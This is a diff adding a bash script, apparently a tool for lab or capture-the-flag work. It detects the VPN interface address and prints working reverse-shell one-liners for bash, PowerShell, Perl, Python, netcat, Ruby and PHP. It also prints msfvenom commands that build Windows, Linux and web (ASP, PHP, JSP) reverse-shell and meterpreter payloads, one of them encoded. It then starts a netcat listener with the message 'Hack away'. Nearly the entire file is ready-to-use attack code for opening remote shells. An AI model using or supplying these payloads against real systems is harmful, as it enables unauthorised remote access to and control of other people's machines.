@@ -1,0 +1,71 @@
+#!/bin/bash
+
+
+echo -e "\e[31m"
+cat << "EOF"
+   _____ __         ____      ______
+  / ___// /_  ___  / / /     / ____/__  ____
+  \__ \/ __ \/ _ \/ / /_____/ / __/ _ \/ __ \
+ ___/ / / / /  __/ / /_____/ /_/ /  __/ / / /
+/____/_/ /_/\___/_/_/      \____/\___/_/ /_/
+
+EOF
+echo -e "\e[0m"
+echo -e "\e[40;38;5;82m Author \e[30;48;5;82m @the-c0d3r \e[0m"
+
+if [ "$#" -ne 1 ]; then
+    echo -e "\nUsage: shgen <PORT>"
+    exit 1
+fi
+
+IP=$(/sbin/ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1)
+PORT=$1
+
+
+echo -e "\n\e[31m=== BASH \e[0m"
+echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+
+echo -e "\n\e[31m=== PowerShell \e[0m"
+echo "\$ip='$IP';\$port=$PORT;\$client = New-Object System.Net.Sockets.TCPClient(\$ip,\$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+
+echo -e "\n\e[31m=== Pearl \e[0m"
+echo "perl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+
+echo -e "\n\e[31m=== Python \e[0m"
+echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+echo -e "\n\e[31m=== nc \e[0m"
+echo "nc.exe $IP $PORT -e cmd.exe"
+echo "nc -e /bin/sh $IP $PORT"
+echo "rm /tmp/zero$PORT;mkfifo /tmp/zero$PORT;cat /tmp/zero$PORT|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/zero$PORT"
+
+echo -e "\n\e[31m=== Ruby \e[0m"
+echo "ruby -rsocket -e'f=TCPSocket.open(\"$IP\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+
+echo -e "\n\e[31m=== Php \e[0m"
+echo "php -r '\$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+
+echo -e "\n\e[31m==========================\e[0m"
+
+echo -e "\n\e[31m=== MSF Venom Payloads\e[0m"
+echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f exe > shell.exe"
+echo "msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f exe -e x86/shikata_ga_nai -i 8 > shell.exe"
+
+echo -e "\nnon-staged linux"
+echo "msfvenom -p linux/x86/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f elf > shell.elf"
+echo "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f elf > shell.elf"
+echo "msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT -f elf > shell.elf"
+echo "msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT -f elf > shell.elf"
+
+
+echo -e "\n\e[31m=== WEB \e[0m"
+echo "msfvenom -p windows/shell/reverse_tcp LHOST=$IP LPORT=$PORT -f asp > shell.asp"
+echo "msfvenom -p php/reverse_php LHOST=$IP LPORT=$PORT -f raw > shell.php"
+echo "msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f raw > shell.jsp"
+
+
+echo "---"
+echo "Running nc reverse shell handler"
+echo "Hack away"
+
+nc -lvp $PORT
